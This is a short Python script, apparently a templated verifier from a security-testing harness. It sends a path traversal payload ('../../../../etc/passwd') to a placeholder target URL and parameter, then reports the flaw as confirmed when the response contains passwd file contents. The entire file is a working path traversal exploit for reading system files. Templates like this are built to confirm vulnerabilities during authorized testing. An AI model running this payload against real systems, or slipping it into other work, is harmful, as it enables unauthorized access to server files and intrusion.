import sys
import requests
import requests.exceptions

def verify():
    target_url = "{{TARGET_URL}}"
    payload = "../../../../etc/passwd"
    
    try:
        print(f"[+] Attempting path traversal at {target_url} with payload {payload}")
        resp = requests.get(target_url, params={"{{PARAM}}": payload}, timeout=5)
        
        if "root:x:0:0:" in resp.text:
            print("[+] CONFIRMED: /etc/passwd contents found in response.")
            sys.exit(0)
        else:
            print("[-] REJECTED: Target file not found in response.")
            sys.exit(1)
            
    except requests.exceptions.ConnectionError:
        print("[-] REJECTED: Connection refused (Sandbox is likely isolated / --network none).")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    verify()
